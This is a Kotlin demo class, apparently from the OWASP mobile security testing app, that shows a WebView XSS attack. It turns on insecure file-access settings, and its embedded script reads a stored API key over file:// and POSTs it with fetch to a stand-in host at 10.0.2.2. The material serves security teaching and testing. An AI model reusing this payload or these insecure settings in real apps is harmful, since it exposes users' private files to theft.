package org.owasp.mastestapp

import android.content.Context
import android.webkit.WebView
import java.io.*

/**
 * This class writes a sensitive file ("api-key.txt") into internal storage and then loads a vulnerable
 * page into a WebView. That page simulates an XSS injection:
 * an attacker's script (running in the context of the vulnerable page) makes an `XMLHttpRequest` to
 * read the sensitive file via the file system and then uses `fetch` to send the content to an external server.
 *
 * By loading the page with a `file://` base URL and enabling universal access from file URLs,
 * we relax the default restriction (which would otherwise treat `file://` requests as opaque origin)
 * and allow the `XMLHttpRequest` to succeed.
 */
class MastgTestWebView(private val context: Context) {

    fun mastgTest(webView: WebView) {
        // Write a sensitive file (for example, cached credentials or private data).
        val sensitiveFile = File(context.filesDir, "api-key.txt")
        sensitiveFile.writeText("MASTG_API_KEY=072037ab-1b7b-4b3b-8b7b-1b7b4b3b8b7b")
        val filePath = sensitiveFile.absolutePath

        // Configure the WebView.
        webView.settings.apply {
            /* `javaScriptEnabled` is required for the attacker's script to even execute.
             * This is very common in WebViews, unless they only load static content.
            */
            javaScriptEnabled = true

            /* `allowFileAccess` is required in this attack since it
             * allows the WebView to load local files from the app's internal or external storage.
             * This app has a `minSdkVersion` of 29, the default value is `true`
             * unless you run it on a device with an API level of 30 or higher.
            */
            allowFileAccess = true

            /* `allowFileAccessFromFileURLs` is required in this attack since it
             * lets JavaScript within those local files access other local files.
            */
            allowFileAccessFromFileURLs = true

            /* `allowUniversalAccessFromFileURLs` is not really required in this attack because
             * the `allowFileAccessFromFileURLs` setting already allows the attacker's script to
             * access the sensitive file via the file system.
            */
            // allowUniversalAccessFromFileURLs = true
        }

        // Vulnerable HTML simulating an XSS injection.
        // The attacker-injected script uses XMLHttpRequest to load the sensitive file from the file system.
        val vulnerableHtml = """
            <html>
              <head>
                <meta charset="utf-8">
                <title>MASTG-DEMO</title>
              </head>
              <body>
                <h1>MASTG-DEMO-0031</h1>
                <p>This HTML page is vulnerable to XSS. An attacker was able to inject JavaScript to exfiltrate data from the app internal storage using file:// URIs.</p>
                <p>The file is located in $filePath</p>
                <p>NOTE: For demo purposes we display the exfiltrated data on screen. However, the user wouldn't even notice as the data is exfiltrated silently.</p>
                <script type="text/javascript">
                  function exfiltrate(data) {
                    
                    var output = document.createElement("div");
                    output.style.color = "white";
                    output.style.borderRadius = "5px";
                    output.style.backgroundColor = "red";
                    output.style.padding = "1em";
                    output.style.marginTop = "1em";
                    output.innerHTML = "<strong>Exfiltrated Data:</strong><br>" + data;
                    document.body.appendChild(output);
                            
                    // Send the text file content to the external server
                    fetch('http://10.0.2.2:5001/receive', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'text/plain'
                        },
                        body: data
                    })
                    .then(response => console.log('File content sent successfully.'))
                    .catch(err => console.error('Error sending file content:', err));
                  }
                    function readSensitiveFile() {
                      var xhr = new XMLHttpRequest();
                      xhr.onreadystatechange = function() {
                        if (xhr.readyState === XMLHttpRequest.DONE) {
                          // For local file requests, a status of 0 with a non-empty responseText indicates success.
                          if (xhr.status === 200 || (xhr.status === 0 && xhr.responseText)) {
                            exfiltrate(xhr.responseText);
                          } else {
                            exfiltrate("Error reading file: " + xhr.status);
                          }
                        }
                      };
                
                      xhr.onerror = function() {
                        exfiltrate("Network error occurred while reading the file.");
                      };
                
                      xhr.open("GET", "$filePath", true);
                      xhr.send();
                    }
                  // Simulate the injected payload triggering.
                  readSensitiveFile();
                </script>
              </body>
            </html>
        """.trimIndent()

        // Load the vulnerable HTML.
        // Using a base URL with the file:// scheme gives the page a non‑opaque origin (using content:/// works the same way).
        webView.loadDataWithBaseURL(
            "file:///",
            vulnerableHtml,
            "text/html",
            "UTF-8",
            null
        )
    }
}
